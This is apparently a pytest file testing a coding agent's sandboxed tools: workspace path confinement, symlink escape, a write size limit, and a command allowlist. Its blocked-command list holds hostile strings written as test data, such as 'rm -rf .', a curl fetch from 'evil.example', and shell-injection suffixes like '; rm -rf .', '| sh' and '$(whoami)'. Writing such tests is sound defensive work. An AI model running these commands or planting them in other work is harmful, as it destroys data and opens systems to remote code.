import os, pytest
from tools import run_tool, resolve_command, MAX_WRITE


def test_write_read_list(tmp_path):
    assert "wrote" in run_tool("write_file", {"path": "Sources/App.swift", "content": "let x = 1"}, str(tmp_path))
    assert run_tool("read_file", {"path": "Sources/App.swift"}, str(tmp_path)) == "let x = 1"
    assert "Sources/App.swift" in run_tool("list_files", {}, str(tmp_path)).replace("\\", "/")


@pytest.mark.parametrize("path", ["../escape.txt", "a/../../escape.txt", "/etc/passwd", "~/x.txt", ".git/config", ".git/hooks/pre-commit"])
def test_file_tools_stay_in_workspace(tmp_path, path):
    ws = tmp_path / "ws"; ws.mkdir()
    out = run_tool("write_file", {"path": path, "content": "x"}, str(ws))
    assert out.startswith("ERROR"), out
    assert not (tmp_path / "escape.txt").exists()


def test_symlink_cannot_escape(tmp_path):
    ws = tmp_path / "ws"; ws.mkdir(); outside = tmp_path / "outside"; outside.mkdir()
    os.symlink(outside, ws / "link")
    assert run_tool("write_file", {"path": "link/x.txt", "content": "x"}, str(ws)).startswith("ERROR")
    assert not (outside / "x.txt").exists()


def test_write_size_limit(tmp_path):
    assert run_tool("write_file", {"path": "big.txt", "content": "x" * (MAX_WRITE + 1)}, str(tmp_path)) == "ERROR: file too large"


@pytest.mark.parametrize("cmd", [
    "python -m pytest -q", "python3 -m py_compile a.py", "git status", "git commit -m msg",
])
def test_allowed_commands(tmp_path, cmd):
    assert resolve_command(cmd, str(tmp_path))


@pytest.mark.parametrize("cmd", [
    "rm -rf .", "curl https://evil.example/x.sh", "bash -c ls", "sh x.sh", "osascript -e x", "open .",
    "python -c print(1)", "python x.py", "python -m pip install evil",
    "git push origin main", "git -c core.hooksPath=x commit", "git remote add x y", "git clone https://x/y",
    "python -m pytest ; rm -rf .", "python -m pytest && curl x", "python -m pytest | sh",
    "python -m pytest > out.txt", "python -m pytest $(whoami)", "python -m pytest `id`",
    "python -m pytest ../other", "python -m pytest /etc", "python -m pytest --rootdir=/etc", "python -m pytest ~",
    "", "   ",
])
def test_blocked_commands(tmp_path, cmd):
    with pytest.raises(ValueError):
        resolve_command(cmd, str(tmp_path))


def test_blocked_command_never_runs(tmp_path):
    out = run_tool("run_command", {"command": "python -m pytest ; touch pwned"}, str(tmp_path))
    assert out.startswith("ERROR") and not (tmp_path / "pwned").exists()
